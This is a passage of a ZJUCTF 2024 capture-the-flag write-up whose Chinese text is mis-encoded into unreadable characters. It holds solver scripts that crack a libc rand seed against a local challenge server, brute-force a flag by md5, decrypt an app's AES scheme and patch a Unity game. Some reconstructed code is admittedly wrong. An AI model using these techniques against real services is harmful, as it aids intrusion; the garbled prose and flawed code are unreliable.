class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> ctypes<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>io = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">63610</span>)<br>io.recv()<br>io.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>io.recvline()<br>io.recvline()<br>io.recvline()<br>io.recvline()<br>rand1,rand2 = [<span class="hljs-built_in">int</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[:-<span class="hljs-number">1</span>].split(<span class="hljs-string">&quot;?&quot;</span>)]<br><span class="hljs-built_in">print</span>(rand1,rand2)<br>libc = ctypes.CDLL(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br>temp = libc.time(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">range</span>(temp)):<br>    libc.srand(i)<br>    tmp1 = libc.rand()<br>    tmp2 = libc.rand()<br>    testrand1 = (tmp1 &lt;&lt; <span class="hljs-number">31</span>) | tmp2 ^ libc.rand()<br>    testrand2 = tmp2 | ((tmp1 ^ libc.rand()) &lt;&lt; <span class="hljs-number">31</span>)<br>    <span class="hljs-keyword">if</span> testrand1==rand1 <span class="hljs-keyword">and</span> testrand2==rand2:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;bomb! time is %d&quot;</span> % i)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/24.png"></p></li><li><p>æœ€ååŠ ä¸Šoffsetå°±èƒ½å¾—åˆ°flagäº†ï¼š <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python">offset = <span class="hljs-number">1729249263</span>-<span class="hljs-number">1287399664</span><br>realtime = temp - offset<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(realtime-<span class="hljs-number">60</span>,realtime+<span class="hljs-number">60</span>):<br>    libc.srand(i)<br>    tmp1 = libc.rand()<br>    tmp2 = libc.rand()<br>    testrand1 = (tmp1 &lt;&lt; <span class="hljs-number">31</span>) | tmp2 ^ libc.rand()<br>    testrand2 = tmp2 | ((tmp1 ^ libc.rand()) &lt;&lt; <span class="hljs-number">31</span>)<br>    <span class="hljs-keyword">if</span> testrand1==rand1 <span class="hljs-keyword">and</span> testrand2==rand2:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;bomb! time is %d&quot;</span> % i)<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getans</span>(<span class="hljs-params">time,<span class="hljs-built_in">len</span></span>):<br>    ans = <span class="hljs-string">&quot;&quot;</span><br>    libc.srand(time)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>):<br>        tmp1 = libc.rand()<br>        tmp2 = libc.rand()<br>        testrand1 = (tmp1 &lt;&lt; <span class="hljs-number">31</span>) | tmp2 ^ libc.rand()<br>        testrand2 = tmp2 | ((tmp1 ^ libc.rand()) &lt;&lt; <span class="hljs-number">31</span>)<br>        <span class="hljs-keyword">if</span> testrand1&gt;testrand2:<br>            ans+=<span class="hljs-string">&quot;&gt;&quot;</span><br>        <span class="hljs-keyword">elif</span> testrand1==testrand2:<br>            ans+=<span class="hljs-string">&quot;=&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            ans+=<span class="hljs-string">&quot;&lt;&quot;</span><br>    <span class="hljs-keyword">return</span> ans<br><br>io.recv()<br>ans = getans(i,<span class="hljs-number">0x1000</span>*<span class="hljs-number">3</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    io.send(ans[i*<span class="hljs-number">0x1000</span>:i*<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x1000</span>])<br>    time.sleep(<span class="hljs-number">1</span>)<br>    io.recv()<br>io.send(<span class="hljs-string">b&quot;submit&quot;</span>)<br>io.interactive()<br><br><span class="hljs-comment"># ZJUCTF&#123;5aK1-CHan&#x27;s_k0k0r0_ls_5m4sh3d_oTATo&#125;</span><br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/25.png"></p></li></ul><div class="note note-info">            <p>ä½†å…¶å®å¯ä»¥ç”¨Cè¯­è¨€çš„LCGä¼ªéšæœºç”Ÿæˆæ–¹å¼ç ´è§£ï¼Œæˆ‘ç”šè‡³å¿˜äº†è¿™å›äº‹ğŸ˜‘</p>          </div><h2 id="rukma">rukma</h2><ul><li>ç¨å¾®é€†å‘äº†ä¸€ä¸‹ï¼Œå‘ç°æ˜¯ä¸ªæ¸¸æˆï¼Œflagæ˜¯ç”±x,m,o,-ç»„åˆè€Œæˆçš„ï¼Œæ¯é‡åˆ°x,m,oå°±å¯¹8ä¸ªæ¯”ç‰¹çš„åˆ—è¡¨è¿›è¡Œäº¤æ¢æ”¹å˜ç­‰æ“ä½œï¼Œæœ€ç»ˆç›®æ ‡æ˜¯å¾—åˆ°5ä¸ª3ï¼Œè¿˜ç»™äº†flagçš„md5å€¼ï¼š <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br>flag = <span class="hljs-string">&quot;m-x-m-m-o-o-x-o-m-x-o-x&quot;</span><br><br><span class="hljs-comment"># - æœ‰ 11 ä¸ª</span><br>b = [<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">magic</span>(<span class="hljs-params">tmp1,tmp2</span>):<br>    <span class="hljs-keyword">if</span> tmp1:<br>        <span class="hljs-keyword">if</span> b[<span class="hljs-number">1</span>]==<span class="hljs-number">3</span>:<br>            b[<span class="hljs-number">1</span>]==<span class="hljs-number">2</span><br>    <span class="hljs-keyword">if</span> tmp2:<br>        <span class="hljs-keyword">if</span> b[<span class="hljs-number">4</span>]==<span class="hljs-number">3</span> <span class="hljs-keyword">and</span> b[<span class="hljs-number">6</span>]==<span class="hljs-number">2</span>:<br>            b[<span class="hljs-number">6</span>]=<span class="hljs-number">3</span><br>        <span class="hljs-keyword">elif</span> b[<span class="hljs-number">4</span>]==<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> b[<span class="hljs-number">6</span>]==<span class="hljs-number">3</span>:<br>            b[<span class="hljs-number">6</span>]=<span class="hljs-number">2</span><br>        <span class="hljs-keyword">elif</span> b[<span class="hljs-number">4</span>]==<span class="hljs-number">2</span> <span class="hljs-keyword">and</span> b[<span class="hljs-number">6</span>]==<span class="hljs-number">3</span>:<br>            b[<span class="hljs-number">4</span>]=<span class="hljs-number">3</span><br>        <span class="hljs-keyword">if</span> b[<span class="hljs-number">5</span>]==<span class="hljs-number">3</span> <span class="hljs-keyword">and</span> b[<span class="hljs-number">7</span>]==<span class="hljs-number">2</span>:<br>            b[<span class="hljs-number">7</span>]=<span class="hljs-number">3</span><br>        <span class="hljs-keyword">elif</span> b[<span class="hljs-number">5</span>]==<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> b[<span class="hljs-number">7</span>]==<span class="hljs-number">3</span>:<br>            b[<span class="hljs-number">7</span>]==<span class="hljs-number">2</span><br>        <span class="hljs-keyword">elif</span> b[<span class="hljs-number">5</span>]==<span class="hljs-number">2</span> <span class="hljs-keyword">and</span> b[<span class="hljs-number">7</span>]==<span class="hljs-number">3</span>:<br>            b[<span class="hljs-number">5</span>]==<span class="hljs-number">3</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>    tmp = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> b:<br>        <span class="hljs-keyword">if</span> i==<span class="hljs-number">3</span>:<br>            tmp+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> tmp==<span class="hljs-number">5</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(flag),<span class="hljs-number">2</span>):<br>    i = flag[j]<br>    <span class="hljs-keyword">if</span> i == <span class="hljs-string">&quot;x&quot;</span>:<br>        b[<span class="hljs-number">3</span>],b[<span class="hljs-number">5</span>],b[<span class="hljs-number">2</span>],b[<span class="hljs-number">4</span>] = b[<span class="hljs-number">5</span>],b[<span class="hljs-number">2</span>],b[<span class="hljs-number">4</span>],b[<span class="hljs-number">3</span>]<br>        magic(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">if</span> i == <span class="hljs-string">&quot;m&quot;</span>:<br>            b[<span class="hljs-number">0</span>],b[<span class="hljs-number">3</span>],b[<span class="hljs-number">1</span>],b[<span class="hljs-number">2</span>] = b[<span class="hljs-number">3</span>],b[<span class="hljs-number">1</span>],b[<span class="hljs-number">2</span>],b[<span class="hljs-number">0</span>]<br>            magic(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">elif</span> i == <span class="hljs-string">&quot;o&quot;</span>:<br>            b[<span class="hljs-number">0</span>],b[<span class="hljs-number">5</span>],b[<span class="hljs-number">1</span>],b[<span class="hljs-number">4</span>] = b[<span class="hljs-number">5</span>],b[<span class="hljs-number">1</span>],b[<span class="hljs-number">4</span>],b[<span class="hljs-number">0</span>]<br>            magic(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">else</span>:<br>            b = [<span class="hljs-number">0</span>]*<span class="hljs-number">8</span><br><br>md5_value = <span class="hljs-string">&quot;0A7E520E468C218583034BD49BE3B5DC&quot;</span><br><span class="hljs-built_in">print</span>(b)<br></code></pre></td></tr></table></figure></li><li>ä½†æ˜¯çœ‹äº†åŠå¤©ä¹Ÿæ²¡æœ‰ç†è§£x,m,oå¯¹åº”æ“ä½œçš„æ„ä¹‰æ˜¯ä»€ä¹ˆï¼Œç„¶åå‘ç°å¯å˜çš„å­—ç¬¦å°±3ä¸ªï¼Œ3**12ç§å¯èƒ½å®Œå…¨å¯ä»¥æ ¹æ®md5çˆ†ç ´ï¼ˆæœ€åæŠŠflagä»£å›å»å‘ç°åˆ—è¡¨ä¹Ÿæ²¡æœ‰5ä¸ª3ï¼Œè‚¯å®šå“ªé‡Œé€†å‘é”™äº†ï¼Œæ‡’å¾—æ”¹äº†ï¼‰ï¼š <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br>chars = [<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>]<br>combinations = itertools.product(chars, repeat=<span class="hljs-number">12</span>)<br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getflag</span>(<span class="hljs-params">s</span>):<br>    flag = s[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>):<br>        flag+=<span class="hljs-string">&quot;-&quot;</span>+s[i+<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> flag<br>res = <span class="hljs-string">&quot;0A7E520E468C218583034BD49BE3B5DC&quot;</span>.lower()<br><span class="hljs-built_in">print</span>(res)<br><span class="hljs-keyword">for</span> combo <span class="hljs-keyword">in</span> combinations:<br>    test = getflag(<span class="hljs-string">&quot;&quot;</span>.join(combo))<br>    i+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> i%<span class="hljs-number">100</span>==<span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i&#125;</span> / 531441&quot;</span>)<br>    <span class="hljs-keyword">if</span> md5(test.encode()).hexdigest()==res:<br>        <span class="hljs-built_in">print</span>(test)<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># ZJUCTF&#123;m-x-m-m-o-o-x-o-m-x-o-x&#125;</span><br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/26.png"></li></ul><h2 id="minecraft">minecraft</h2><ul><li>ç”¨dnSpyé€†å‘dataç›®å½•ä¸‹çš„<code>Assembly-CSharp.dll</code>æ–‡ä»¶ï¼Œå¾—åˆ°æ•´ä¸ªæ¸¸æˆçš„é€»è¾‘ï¼Œè§‚å¯Ÿå•äººæ¸¸æˆçš„ä»£ç ï¼Œå°†åˆå§‹çš„è·å¾—æ–¹å—æ•°ä¿®æ”¹ï¼Œå°±èƒ½å¾—åˆ°ç¬¬ä¸€éƒ¨åˆ†flag( ZJUCTF{lt^5_ ): <img src="/img/zjuctf2024/34.png"> <img src="/img/zjuctf2024/35.png"></li><li>è§‚å¯Ÿä»£ç å¾—åˆ°å¤šäººæ¸¸æˆçš„å…¥å£ä»£ç ï¼Œåº”è¯¥æ˜¯flagçš„ç¬¬äºŒæ®µ(sO_345y_M0dD): <img src="/img/zjuctf2024/36.png"></li><li>æ ¹æ®æç¤ºæŸ¥çœ‹unityå†…éƒ¨çš„èµ„æºï¼Œå¯»æ‰¾ç›¸å…³flagçš„3då»ºæ¨¡ï¼Œæœç„¶å‘ç°äº†ç¬¬ä¸‰ä¸ªflagpiece(1nG_uNi7y_k): <img src="/img/zjuctf2024/37.png"></li><li>æ ¹æ®æç¤ºå»æ‰¾æ²¡æœ‰åº”ç”¨çš„åœºæ™¯ï¼Œå‘ç°æœ‰ä¸€ä¸ª<code>ThroneRoomHandler</code>æ²¡æœ‰ä½¿ç”¨ï¼Œé‚£æ€ä¹ˆè®©unityè°ƒç”¨è¿™ä¸ªåœºæ™¯å‘¢ï¼Œæˆ‘æƒ³äº†åŠå¤©æ‰æƒ³åˆ°ï¼Œå¯ä»¥æŠŠå¤šäººæ¸¸æˆçš„ä»£ç æ”¹æˆ<code>ThroneRoomHandler</code>çš„ä»£ç ï¼Œå¹¶æŠŠunityéœ€è¦åŠ è½½è¯¥åœºæ™¯çš„<code>level4.resS</code>æ”¹æˆå¤šäººæ¸¸æˆæ‰€éœ€è¦çš„åœºæ™¯ï¼Œå°±çœ‹åˆ°äº†flag(VloCk1nG_rE}): <img src="/img/zjuctf2024/38.png"></li><li>è¿èµ·æ¥çš„flag:ZJUCTF{lt^5_sO_345y_M0dD1nG_uNi7y_kVloCK1nG_rE}ï¼Œåšå‡ºæ¥è¿™é¢˜æ˜¯çœŸæœ‰æˆå°±æ„Ÿï¼Œå¤ªéš¾æƒ³äº†ã€‚</li></ul><h2 id="easyhap">easyhap</h2><ul><li>æ˜¯ä¸€é“é¸¿è’™çš„appé€†å‘é¢˜ï¼Œè§£åŒ…åå°†<code>.abc</code>æ–‡ä»¶æ”¾å…¥åˆ†æè½¯ä»¶ï¼Œå°±å¯ä»¥å¾—åˆ°æºä»£ç é€»è¾‘:</li><li>ç¨‹åºå…ˆè§„å®šäº†ä¸€å †çª—å£ï¼Œè¿™è·Ÿappå¤–è²Œæœ‰å…³ï¼Œç„¶åè¯»å–ä½ è¾“å…¥çš„flagï¼Œç”¨CryptoUtilç±»ä¸‹çš„encryptæ–¹æ³•åŠ å¯†flagä¸ä¸€ä¸²å¯†æ–‡æ¯”å¯¹: <img src="/img/zjuctf2024/39.png"></li><li>encryptæ–¹æ³•è¿›è¡Œäº†å››æ¬¡åŠ å¯†ï¼Œå…ˆå°†flagæ‹†æˆå‰åä¸¤éƒ¨åˆ†ï¼Œåˆ†åˆ«å¯¹å…¶è¿›è¡ŒAESçš„ECBå’ŒCBCåŠ å¯†ï¼Œå†å°†åä¸€æ®µä¸å‰ä¸€æ®µå¼‚æˆ–å†ä¸åä¸€æ®µæ‹¼èµ·æ¥ï¼Œæœ€åæ˜¯ä¸€ä¸ªbase64çš„åŠ å¯†: <img src="/img/zjuctf2024/40.png"></li><li>å†™ä¸ªè„šæœ¬å¾—åˆ°flag: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br>res = <span class="hljs-string">&quot;Uzzj0V3pAh3AlPJ150WajAyXXST9UrJOdAo6iGDSj1c=&quot;</span><br>tmp = b64decode(res)<br>new = <span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    new += <span class="hljs-built_in">bytes</span>([tmp[i]^tmp[i+<span class="hljs-number">16</span>]])<br>new+=tmp[<span class="hljs-number">16</span>:]<br><span class="hljs-built_in">print</span>(new)<br>cipher = AES.new(<span class="hljs-string">b&quot;ZJUCTF2024-OHAPP&quot;</span>, AES.MODE_ECB)<br>new1 = cipher.decrypt(new[:<span class="hljs-number">16</span>])<br>cipher = AES.new(<span class="hljs-string">b&quot;ZJUCTF2024-OHAPP&quot;</span>, AES.MODE_CBC,new[:<span class="hljs-number">16</span>])<br>new2 = cipher.decrypt(new[<span class="hljs-number">16</span>:])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">b&quot;ZJUCTF&#123;&quot;</span>+new1+new2+<span class="hljs-string">b&quot;&#125;&quot;</span>)<br><br><span class="hljs-comment"># ZJUCTF&#123;_@_Ea5Y_ohaPp_@ND_a_5iMPl3_fl4g_&#125;</span><br></code></pre></td></tr></table></figure></li></ul><h1 id="pwn"><strong>Pwn</strong></h1><div class="note note-danger">            <p>ä¸ä¼špwn...</p>          </div><h1 id="misc"><strong>Misc</strong></h1><p>è¿™éƒ¨åˆ†é¢˜ç›®æ˜¯æœ€æœ‰æ„æ€çš„ï¼Œéœ€è¦çš„è„‘æ´å¾ˆå¤§ğŸ«¨</p><h2 id="å°aå£ç®—">å°Aå£ç®—</h2><ul><li>ä¸æœåŠ¡å™¨äº¤äº’ï¼Œç±»ä¼¼äºå°çŒ¿å£ç®—</li><li>ç”¨pwndbgäº¤äº’å³å¯: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">63142</span>)<br>io.recv()<br>io.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>io.recvline()<br>io.recvline()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getans</span>():<br>    tmp = io.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tmp.split(<span class="hljs-string">&quot;\n&quot;</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;?&quot;</span> <span class="hljs-keyword">in</span> i:<br>            problem = i<br>            <span class="hljs-keyword">break</span><br>    num1,num2 = <span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>,problem.split(<span class="hljs-string">&quot;?&quot;</span>))<br>    <span class="hljs-built_in">print</span>(num1,num2)<br>    <span class="hljs-keyword">if</span> num1==num2:<br>        io.sendline(<span class="hljs-string">b&quot;=&quot;</span>)<br>    <span class="hljs-keyword">elif</span> num1&gt;num2:<br>        io.sendline(<span class="hljs-string">b&quot;&gt;&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        io.sendline(<span class="hljs-string">b&quot;&lt;&quot;</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    getans()<br>    <span class="hljs-keyword">if</span>  <span class="hljs-string">&quot;Correct!&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>):<br>        <span class="hljs-keyword">break</span><br>io.interactive()<br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/1.png"></li></ul><h2 id="master-of-c">master of c++</h2><ul><li>ç”¨c++ç¼–å†™ä¸€ä¸ªåˆ¤æ–­è´¨æ•°çš„å‡½æ•°ï¼Œç„¶åç”¨mainè°ƒç”¨ï¼›</li><li>ä¸€å¼€å§‹è¿˜å¡äº†åŠå¤©ï¼Œç”¨é€’å½’å†™çš„ï¼Œè¿˜ä»¥ä¸ºæ˜¯é€’å½’å±‚æ•°è¿‡é«˜å¯¼è‡´ç¼–è¯‘çš„é—®é¢˜ï¼Œåæ¥æ‰å‘ç°æ˜¯æ²¡æœ‰å¤„ç†è´Ÿæ•°æƒ…å†µï¼ˆæ¼ï¼‰: <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-type">int</span> N,<span class="hljs-type">int</span> i&gt;<span class="hljs-keyword">struct</span> <span class="hljs-title class_">P</span>&#123;<span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">bool</span> V=(N%i)&amp;&amp;(P&lt;N,i<span class="hljs-number">-2</span>&gt;::V);&#125;;<br><span class="hljs-keyword">template</span>&lt;<span class="hljs-type">int</span> N&gt;<span class="hljs-keyword">struct</span> <span class="hljs-title class_">P</span>&lt;N,<span class="hljs-number">1</span>&gt;&#123;<span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">bool</span> V=<span class="hljs-literal">true</span>;&#125;;<br><span class="hljs-keyword">template</span>&lt;<span class="hljs-type">int</span> N&gt;<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Q</span>&#123;<span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">bool</span> V=N&lt;<span class="hljs-number">2</span>?<span class="hljs-number">1</span>:N==<span class="hljs-number">2</span>?<span class="hljs-number">0</span>:!(N%<span class="hljs-number">2</span>&amp;&amp;P&lt;N,N/<span class="hljs-number">2</span><span class="hljs-number">+1</span>-(N/<span class="hljs-number">2</span>)%<span class="hljs-number">2</span>&gt;::V);&#125;;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> Q&lt;ARG&gt;::V;&#125;<br></code></pre></td></tr></table></figure></li><li>flagæ˜¯<code>ZJUCTF&#123;pR3m4tuR3_0PT1miz4t1oN_1s_thE_R00t_of_4LL_3v1l&#125;</code></li></ul><h2 id="bytes">Bytes</h2><ul><li><p>æ‹¿åˆ°ä¸€å †æ•°å­—ï¼Œæœ€å¤§çš„æ˜¯63å³6ä½ï¼ŒçŒœæµ‹æ˜¯è½¬åŒ–æˆ0/1å¹¶æŒ‰ç…§æŸç§è§„åˆ™æ˜¾ç¤ºå‡ºflagï¼š <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;bytes.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>li = [<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">6</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.readline().split(<span class="hljs-string">&quot;,&quot;</span>)]<br>text = <span class="hljs-string">&quot;&quot;</span>.join(li)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(text))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>,<span class="hljs-number">300</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(text)%i==<span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(text)//i):<br>            <span class="hljs-built_in">print</span>(text[j*i:(j+<span class="hljs-number">1</span>)*i])<br>        <span class="hljs-built_in">print</span>()<br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/4.png"></p></li><li><p>ä¹‹å‰åšæ ¡å·´ZJUCTF2022é‚£é“ <code>wierd encoding</code> å°±æœ‰è¿™ç§æ€è·¯äº†ï¼Œåªèƒ½è¯´yelançš„æƒ³æ³•è·Ÿæˆ‘ä¸è°‹è€Œåˆï¼ˆï¼‰</p></li></ul><h2 id="chess-encoding">chess encoding</h2><ul><li><p>æ ¹æ®é¢˜ç›®çš„æç¤ºï¼Œç”¨æ£‹ç›˜ç¼–ç ï¼Œç¼–å†™pythonè„šæœ¬ï¼Œæœ€åå¾—åˆ°ä¸€ä¸²æ•°å­—ï¼ŒçŒœæµ‹æ˜¯base8åŠ å¯†ï¼Œå¾—åˆ°flagï¼š <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 